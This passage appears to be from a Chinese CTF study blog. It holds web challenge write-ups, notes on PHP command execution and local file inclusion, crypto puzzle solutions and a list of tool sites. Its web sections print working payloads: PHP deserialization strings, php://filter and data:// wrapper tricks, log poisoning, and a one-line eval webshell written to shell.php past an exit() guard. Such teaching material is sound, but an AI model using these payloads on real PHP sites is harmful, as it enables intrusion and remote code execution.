<p>先是一堆绕过，然后反序列化<br>绕过很简单，重点在反序列化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class BUU &#123;</span><br><span class="line">   public <span class="variable">$correct</span> = <span class="string">""</span>;</span><br><span class="line">   public <span class="variable">$input</span> = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;correct === <span class="variable">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="built_in">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new BUU();</span><br><span class="line"><span class="variable">$a</span>-&gt;input=&amp;<span class="variable">$a</span>-&gt;correct; //关键点</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">以get方式传参   ?pleaseget=1</span><br><span class="line">以post方式传参      pleasepost=2&amp;md51[]=a&amp;md52[]=b&amp;obj=O:3:<span class="string">"BUU"</span>:2:&#123;s:7:<span class="string">"correct"</span>;s:0:<span class="string">""</span>;s:5:<span class="string">"input"</span>;R:2;&#125;</span><br></pre></td></tr></table></figure>
<p>拿到flag{4f080ca0-191d-44f7-a076-790e8210cf87} </p>
<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="built_in">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  //useless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>第一步构造满足条件的text，利用data协议将文件流重定向</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/NiZhuanSiWei/NiZhuanSiWei.jpg" alt=""><br>第二步就是要获取useless.php的代码,利用filter伪协议</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo</span><br></pre></td></tr></table></figure>
<p>解码后为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public <span class="variable">$file</span>;  </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__tostring</span></span>()&#123;  </span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="built_in">echo</span> file_get_contents(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="built_in">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>反序列化漏洞利用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public <span class="variable">$file</span>;  </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__tostring</span></span>()&#123;  </span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="built_in">echo</span> file_get_contents(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="built_in">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=new Flag();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:<span class="string">"Flag"</span>:1:&#123;s:4:<span class="string">"file"</span>;s:8:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>在源码中拿到flag</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/2020/05/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>Web应用有时需要调用一些可以执行系统命令的函数<br>常用的PHP命令执行函数：system、exec、shell_exec、passthru、popen、proc_popen等<br>当用户能够控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，即命令执行漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;       前面的执行完执行后面的</span><br><span class="line">|       管道符，前面执行结果的输出作为后面的输入</span><br><span class="line">||      当前面的执行出错时执行后面的</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>密码学</title>
    <url>/2020/02/26/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    <content><![CDATA[<h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#仿射变换，仿射密码</span></span><br><span class="line"><span class="comment">#加密变换：c=Ea,b(m)≡am+b(mod 26)</span></span><br><span class="line"><span class="comment">#解密变换：m=Da,b(c)≡(a^-1)(c-b)(mod 26)</span></span><br><span class="line">def encode(a,b,flag):</span><br><span class="line">    keys=<span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">    cipher=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        n1=ord(i)-97</span><br><span class="line">        c=(a*n1+b)%26</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">            <span class="keyword">if</span> ord(j)-97==c:</span><br><span class="line">                cipher+=j</span><br><span class="line">    <span class="built_in">return</span> cipher</span><br><span class="line">    </span><br><span class="line">def decode(a,b,cipher):</span><br><span class="line">    keys=<span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">    flag=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        n1=ord(i)-97</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(26):</span><br><span class="line">            <span class="keyword">if</span> (j*a)%26==(n1-b)%26:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> keys:</span><br><span class="line">                    <span class="keyword">if</span> ord(k)-97==j:</span><br><span class="line">                        flag+=k</span><br><span class="line">    <span class="built_in">return</span> flag</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="Diffie-Hellman密钥交换协议"><a href="#Diffie-Hellman密钥交换协议" class="headerlink" title="Diffie-Hellman密钥交换协议"></a>Diffie-Hellman密钥交换协议</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/cryptography/1.jpg" alt=""></p>
<h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><p>攻击者C能够截获用户A、B之间的通信<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/cryptography/2.jpg" alt=""></p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界-Crypto</title>
    <url>/2020/02/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Crypto/</url>
    <content><![CDATA[<h2 id="你猜猜"><a href="#你猜猜" class="headerlink" title="你猜猜"></a>你猜猜</h2><p>题目描述：我们刚刚拦截了，敌军的文件传输获取一份机密文件，请君速速破解。<br>打开附件，一段16进制数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">504B03040A0001080000626D0A49F4B5091F1E0000001200000008000000666C61672E7478746C9F170D35D0A45826A03E161FB96870EDDFC7C89A11862F9199B4CD78E7504B01023F000A0001080000626D0A49F4B5091F1E00000012000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800AF150210CAF2D1015CAEAA05CAF2D1015CAEAA05CAF2D101504B050600000000010001005A000000440000000000</span><br></pre></td></tr></table></figure>
<p>转ASCII码，发现是PK开头的，应该是压缩包文件，用winhex保存为zip文件</p>
<a id="more"></a>
<p><img src="http://q63cs67co.bkt.clouddn.com/zip.PNG" alt=""><br>结果被加密了，爆破后密码为123456<br>daczcasdqwdcsdzasd</p>
<h2 id="enc"><a href="#enc" class="headerlink" title="enc"></a>enc</h2><p>题目描述：Fady不是很理解加密与编码的区别 所以他使用编码而不是加密，给他的朋友传了一些秘密的消息。<br>附件打开后是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ZERO ONE ZERO ZERO ONE ONE ZERO ZERO ZERO ONE ONE ZERO .................</span><br></pre></td></tr></table></figure>
<p>明显ZERO要转为0，ONE转为1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file1=open(<span class="string">"1.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> miwen <span class="keyword">in</span> file1:</span><br><span class="line">    list1=miwen.split()</span><br><span class="line">    result=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">"ZERO"</span>:</span><br><span class="line">            result=result+<span class="string">'0'</span></span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">"ONE"</span>:</span><br><span class="line">            result=result+<span class="string">'1'</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">file1.close()</span><br></pre></td></tr></table></figure>
<p>二进制转为16进制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">4c6930674c6930754c694175494330754c6930674c5334744c694174494334754c5334674c5341754c693475494334744c533074494334754c693475494330744c5341754c5330744c5341754c6934674c533074494334754c693475494334754c5341754c533075494334754c693074494334744c6941744c5330674c6934754c6934674c6941744c693075494334744c6941754c6934744c534174494330744c534174494330754c6930674c513d3d</span><br></pre></td></tr></table></figure>
<p>在转为ASCII码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Li0gLi0uLiAuIC0uLi0gLS4tLiAtIC4uLS4gLSAuLi4uIC4tLS0tIC4uLi4uIC0tLSAuLS0tLSAuLi4gLS0tIC4uLi4uIC4uLSAuLS0uIC4uLi0tIC4tLiAtLS0gLi4uLi4gLiAtLi0uIC4tLiAuLi4tLSAtIC0tLSAtIC0uLi0gLQ==</span><br></pre></td></tr></table></figure>
<p>发现是base64，再解密</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.- .-.. . -..- -.-. - ..-. - .... .---- ..... --- .---- ... --- ..... ..- .--. ...-- .-. --- ..... . -.-. .-. ...-- - --- - -..- -</span><br></pre></td></tr></table></figure>
<p>是摩斯密码，解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ALEXCTFTH15O1SO5UP3RO5ECR3TOTXT</span><br></pre></td></tr></table></figure>
<p>然而并不对，额。。。<br>发现这段字符串中间有个CTF，应该是要把后面的用{}包起来，也就是ALEXCTF{TH15O1SO5UP3RO5ECR3TOTXT}<br>还是不对，唉，我麻了，看了别人的WP,就差一步了，我。。。，把 O 换成 _ 就好了，也就是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ALEXCTF&#123;TH15_1S_5UP3R_5ECR3T_TXT&#125;</span><br></pre></td></tr></table></figure>
<h2 id="告诉你个秘密"><a href="#告诉你个秘密" class="headerlink" title="告诉你个秘密"></a>告诉你个秘密</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">636A56355279427363446C4A49454A7154534230526D6843</span><br><span class="line">56445A31614342354E326C4B4946467A5769426961453067</span><br></pre></td></tr></table></figure>
<p>转为ASCII码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g</span><br></pre></td></tr></table></figure>
<p>应该是base64，解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</span><br></pre></td></tr></table></figure>
<p>键盘密码,解码后为TONGYUAN</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>常用网站</title>
    <url>/2020/01/10/%E5%B8%B8%E7%94%A8%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p><a href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a><br><a href="https://www.tutorialspoint.com/execute_brainfk_online.php" target="_blank" rel="noopener">https://www.tutorialspoint.com/execute_brainfk_online.php</a></p>
<h3 id="Ook"><a href="#Ook" class="headerlink" title="Ook"></a>Ook</h3><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
<a id="more"></a>
<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><p><a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener">https://tool.lu/hexconvert/</a></p>
<h3 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h3><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p>
<h3 id="文件头信息"><a href="#文件头信息" class="headerlink" title="文件头信息"></a>文件头信息</h3><p><a href="https://blog.csdn.net/ccj2020/article/details/87603903" target="_blank" rel="noopener">https://blog.csdn.net/ccj2020/article/details/87603903</a></p>
<h3 id="词频分析"><a href="#词频分析" class="headerlink" title="词频分析"></a>词频分析</h3><p><a href="https://www.quipqiup.com/" target="_blank" rel="noopener">https://www.quipqiup.com/</a></p>
<h3 id="新约佛论禅"><a href="#新约佛论禅" class="headerlink" title="新约佛论禅"></a>新约佛论禅</h3><p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">http://hi.pcmoe.net/buddha.html</a></p>
<h3 id="社会主义核心价值观加密"><a href="#社会主义核心价值观加密" class="headerlink" title="社会主义核心价值观加密"></a>社会主义核心价值观加密</h3><p><a href="http://z.duoluosb.com/" target="_blank" rel="noopener">http://z.duoluosb.com/</a></p>
<h3 id="盲文"><a href="#盲文" class="headerlink" title="盲文"></a>盲文</h3><p>(密文可以为 汉字 数字 字母 音乐符号 国际音标 盲文 韩文 日文 傣文 彝文 箭头符号 花朵符号 俄文)<br><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a></p>
<h3 id="中文在线语音朗读网站"><a href="#中文在线语音朗读网站" class="headerlink" title="中文在线语音朗读网站"></a>中文在线语音朗读网站</h3><p><a href="http://www.duchulai.com/" target="_blank" rel="noopener">http://www.duchulai.com/</a></p>
<h3 id="Python反编译"><a href="#Python反编译" class="headerlink" title="Python反编译"></a>Python反编译</h3><p><a href="https://tool.lu/pyc/" target="_blank" rel="noopener">https://tool.lu/pyc/</a></p>
<h3 id="代码在线测试"><a href="#代码在线测试" class="headerlink" title="代码在线测试"></a>代码在线测试</h3><p><a href="http://www.dooccn.com/" target="_blank" rel="noopener">http://www.dooccn.com/</a></p>
<h3 id="汉字转拼音-生僻字"><a href="#汉字转拼音-生僻字" class="headerlink" title="汉字转拼音(生僻字)"></a>汉字转拼音(生僻字)</h3><p><a href="https://www.dute.me/tools/pinyin/" target="_blank" rel="noopener">https://www.dute.me/tools/pinyin/</a></p>
<h3 id="pcapng文件修复"><a href="#pcapng文件修复" class="headerlink" title="pcapng文件修复"></a>pcapng文件修复</h3><p><a href="http://f00l.de/hacking/pcapfix.php" target="_blank" rel="noopener">http://f00l.de/hacking/pcapfix.php</a></p>
<h3 id="解密网站集合"><a href="#解密网站集合" class="headerlink" title="解密网站集合"></a>解密网站集合</h3><p><a href="https://www.wishingstarmoye.com/" target="_blank" rel="noopener">https://www.wishingstarmoye.com/</a><br><a href="https://blog.csdn.net/qq_41638851/article/details/100526839" target="_blank" rel="noopener">https://blog.csdn.net/qq_41638851/article/details/100526839</a><br><a href="https://www.cnblogs.com/ichunqiu/p/8297620.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/8297620.html</a><br><a href="https://aliyunvi.com/sort/ciphers" target="_blank" rel="noopener">https://aliyunvi.com/sort/ciphers</a></p>
<h3 id="base全家桶"><a href="#base全家桶" class="headerlink" title="base全家桶"></a>base全家桶</h3><p><a href="https://www.cnblogs.com/pcat/p/11625834.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/11625834.html</a></p>
<h3 id="mysql注入总结"><a href="#mysql注入总结" class="headerlink" title="mysql注入总结"></a>mysql注入总结</h3><p><a href="https://www.2cto.com/article/201208/151503.html" target="_blank" rel="noopener">https://www.2cto.com/article/201208/151503.html</a></p>
<h3 id="CTF资源库"><a href="#CTF资源库" class="headerlink" title="CTF资源库"></a>CTF资源库</h3><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">https://www.ctftools.com/down/</a><br><a href="https://www.t00ls.net/pytools.html" target="_blank" rel="noopener">https://www.t00ls.net/pytools.html</a><br><a href="https://wiki.x10sec.org/introduction/resources/" target="_blank" rel="noopener">https://wiki.x10sec.org/introduction/resources/</a></p>
<h3 id="栅栏密码（WWW型）"><a href="#栅栏密码（WWW型）" class="headerlink" title="栅栏密码（WWW型）"></a>栅栏密码（WWW型）</h3><p><a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=777</a><br>质因数分解：<a href="http://www.atool9.com/quality_factor.php" target="_blank" rel="noopener">http://www.atool9.com/quality_factor.php</a></p>
<h3 id="工具下载网站"><a href="#工具下载网站" class="headerlink" title="工具下载网站"></a>工具下载网站</h3><p>隐写术工具：<a href="https://blog.csdn.net/qq_43500877/article/details/91626379" target="_blank" rel="noopener">https://blog.csdn.net/qq_43500877/article/details/91626379</a><br>Hackbar: <a href="https://github.com/HCTYMFF/hackbar2.1.3" target="_blank" rel="noopener">https://github.com/HCTYMFF/hackbar2.1.3</a><br>JPHS Windows 0.5：<a href="https://www.scanwith.com/JPHS_for_Windows_download.htm" target="_blank" rel="noopener">https://www.scanwith.com/JPHS_for_Windows_download.htm</a><br>OutGuess：<a href="https://github.com/crorvick/outguess" target="_blank" rel="noopener">https://github.com/crorvick/outguess</a></p>
<h3 id="图片格式转换"><a href="#图片格式转换" class="headerlink" title="图片格式转换"></a>图片格式转换</h3><p><a href="https://cloudconvert.com/" target="_blank" rel="noopener">https://cloudconvert.com/</a></p>
<h3 id="gmd5"><a href="#gmd5" class="headerlink" title="gmd5"></a>gmd5</h3><p><a href="http://alamina.cn/" target="_blank" rel="noopener">http://alamina.cn/</a></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
  </entry>
  <entry>
    <title>无参函数RCE</title>
    <url>/2020/05/10/%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0RCE/</url>
    <content><![CDATA[<p>由于eval()函数允许执行任意php代码，这就会造成远程代码执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'shell'</span>]);</span><br></pre></td></tr></table></figure>
<p>即一句话木马，就可以getshell了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">'shell'</span>]=system(<span class="string">'ls /'</span>);</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'shell'</span>]);等同于<span class="built_in">eval</span>(system(<span class="string">'ls /'</span>));</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>但是如果正则只允许使用不带参数的函数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/[^\W]+\((?R)?\)/</span><br></pre></td></tr></table></figure>
<p>那么就需要利用一些特殊作用不带参数的函数</p>
<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>localeconv() ：返回包含本地数字及货币格式信息的数组<br>current()、pos() ： 返回数组中的当前单元, 默认取第一个值<br>current(localeconv()) : 只会返回一个点’.’</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(localeconv());</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">print_r(current(localeconv()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/RCE/rce0.jpg" alt=""><br>scandir() ：列出目录中的文件和目录<br>getcwd() ：获得当前目录<br>chdir() ：函数把当前的目录改变为指定的目录<br>highlight_file()、show_source() ：打印输出或者返回文件中语法高亮的代码<br>readfile() ：读取文件并写入到输出缓冲，输出文件<br>array_reverse() ：以相反的元素顺序返回数组<br>next() ：函数将内部指针指向数组中的下一个元素，并输出<br>end() ：将数组的内部指针指向最后一个单元<br>key() ：从关联数组中取得键名<br>prev() ：将数组的内部指针指向第一个单元<br>reset() ：将数组的内部指针指向第一个单元<br>array_rand() ：从数组中随机取出一个或多个单元，不断刷新总能刷新到想要访问的单元<br>array_flip() ：交换数组的键和值<br>session_id(session_start()) ：session_id()可以获取当前的session id,session_start()是来告诉PHP使用session,因为PHP默认是不主动使用session的</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>[GXYCTF2019]禁止套娃: <a href="https://zxfireworks.xyz/2020/03/14/BUUCTF-Web/" target="_blank" rel="noopener">https://zxfireworks.xyz/2020/03/14/BUUCTF-Web/</a></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>文件包含漏洞LFI</title>
    <url>/2020/04/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9ELFI/</url>
    <content><![CDATA[<p>两个重要参数（php.ini文件中）<br>allow_url_fopen<br>allow_url_include<br>包含文件的内容只要符合PHP语法都能被当成php代码进行解析，无关后缀名</p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><h3 id="配合日志文件"><a href="#配合日志文件" class="headerlink" title="配合日志文件"></a>配合日志文件</h3><p>?file=<?php @eval($_POST['shell'];)?><br>这条记录会被记录在日志文件中，但是被url编码了<br>用burpsuite抓包改回去就可以利用了</p>
<a id="more"></a>
<h3 id="配合-proc-self-environ文件（Linux系统环境变量文件）"><a href="#配合-proc-self-environ文件（Linux系统环境变量文件）" class="headerlink" title="配合/proc/self/environ文件（Linux系统环境变量文件）"></a>配合/proc/self/environ文件（Linux系统环境变量文件）</h3><p>?file=/proc/self/environ&amp;shell=id<br>用burp抓包后再UA后面追加一句<?php system($_GET['shell'];?></p>
<h3 id="配合session文件"><a href="#配合session文件" class="headerlink" title="配合session文件"></a>配合session文件</h3><h3 id="利用file协议"><a href="#利用file协议" class="headerlink" title="利用file协议"></a>利用file协议</h3><p>?file=file:///路径</p>
<h3 id="利用php-filter协议"><a href="#利用php-filter协议" class="headerlink" title="利用php://filter协议"></a>利用php://filter协议</h3><p>?file=php://filter/read=convert.base64-encode/resource=include.php</p>
<p>base64编码中只包含64个可打印字符(大小写字母、0-9、+、/)，而PHP在解码base64时，遇到不在其中的字符时，会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</p>
<p>假设要$_POST传入txt=<?php @eval($_POST['shell'];)?></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$content</span> = <span class="string">'&lt;?php exit;?&gt;'</span>; </span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">'txt'</span>];   </span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">'file'</span>],<span class="variable">$content</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>$content在开头增加了exit过程，导致即使成功写入了一句话木马，也执行不了</p>
<h4 id="绕过姿势一"><a href="#绕过姿势一" class="headerlink" title="绕过姿势一"></a>绕过姿势一</h4><p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以增加一个’a’,这样就8个字符了，”phpexita”会被正常解码，而后面传入的一句话的base64内容也会被正常解码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:txt=aPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
<p>这里的”aPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==”,其中第一个’a’是额外加入用来破坏<?php exit;?>解码的，”PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==”就是要传入的一句话的base64编码结果</p>
<p>因为在将$content写入file文中的时候会进行base64解码，即对phpexitaPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==进行解码，解码后的内容写入file文件中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">解码后为?^?Z&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'shell'</span>];)?&gt;</span><br></pre></td></tr></table></figure>
<p>这样exit就失效了,就可以成功利用上传的一句话了</p>
<h4 id="绕过姿势二"><a href="#绕过姿势二" class="headerlink" title="绕过姿势二"></a>绕过姿势二</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">payload:txt=PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddOyk/Pg==&amp;file=php://filter=write=string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
<p>php://filter允许使用多个过滤器(通过管道符连接)，可以先将webshell用base64编码，在调用完成strip_tags后进行base64-decode。”死亡exit”在第一步被去除，而webshell在第二步被还原</p>
<h3 id="利用php-input协议"><a href="#利用php-input协议" class="headerlink" title="利用php://input协议"></a>利用php://input协议</h3><p>主要用来接收post数据，将post请求中的数据作为php代码执行</p>
